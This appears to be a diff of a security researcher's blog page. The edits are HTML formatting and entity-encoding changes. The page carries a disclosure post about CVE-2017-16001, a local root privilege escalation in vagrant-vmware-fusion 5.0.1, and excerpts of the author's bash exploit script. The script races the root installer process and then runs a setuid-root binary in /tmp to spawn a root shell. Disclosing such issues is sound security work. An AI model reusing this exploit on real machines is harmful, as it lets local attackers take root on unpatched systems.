@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,13 +23,14 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/cve201716001-local-root-privesc-in-hashicorp-vagrantvmwarefusion-501.html">CVE-2017-16001 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.1</a></h2>
                 <h3>3 Nov 2017 08:21  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
+                
                   <pre>I recently blogged about how the installation process of version 5.0.0 of this
 plugin could be hihacked by a local attacker or malware in order to escalate
 privileges to root.  Hashicorp pushed some mitigations for this issue fairly
@@ -37,13 +38,13 @@ quickly but unfortunately 5.0.1 is still exploitable with a slightly different
 approach.
 
 They removed the chmod/chown shell commands from their osascript invocation and
-instead simply executed their installer as root, but apparently didn&#39;t realise
+instead simply executed their installer as root, but apparently didn&#x27;t realise
 that the installer is not root-owned so can be swapped out by a local attacker
 during the process.
 
 This issue is fixed in version 5.0.2.
 
-<a href="https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt</a>
+https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt
 c38ecc9fdb4f37323338e8fd12b851133a2121f3505cde664e6d32f1ef49ba23
 -----------------------------------------------------------------------------
 #!/bin/bash
@@ -83,13 +84,13 @@ echo &quot;waiting for user to initiate vagrant plugin update...&quot;
 
 while :
 do
-  r=`ps auxwww |grep &#39;/usr/bin/osascript -e do shell script&#39; |grep &#39;vagrant-vmware-installer_darwin_amd64&#39;`
+  r=`ps auxwww |grep &#x27;/usr/bin/osascript -e do shell script&#x27; |grep &#x27;vagrant-vmware-installer_darwin_amd64&#x27;`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     break
   fi
 done
 
-pid=`ps auxww |grep &#39;./vagrant-vmware-installer_darwin_amd64 install&#39; |grep -v grep |xargs -L1 |cut -d &#39; &#39; -f2`
+pid=`ps auxww |grep &#x27;./vagrant-vmware-installer_darwin_amd64 install&#x27; |grep -v grep |xargs -L1 |cut -d &#x27; &#x27; -f2`
 
 cd $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop
 
@@ -102,16 +103,17 @@ echo &quot;waiting for payload to trigger...&quot;
 
 while :
 do
-  r=`ls -la /tmp/vvf_exp 2&gt;/dev/null |grep -- &#39;-rwsr-xr-x&#39; |grep root`
+  r=`ls -la /tmp/vvf_exp 2&gt;/dev/null |grep -- &#x27;-rwsr-xr-x&#x27; |grep root`
   if [ &quot;$r&quot; != &quot;&quot; ] ; then
     echo &quot;spawning shell...&quot;
     /tmp/vvf_exp
     exit 0
   fi
-done</pre>
+done
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -121,39 +123,67 @@ done</pre>
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
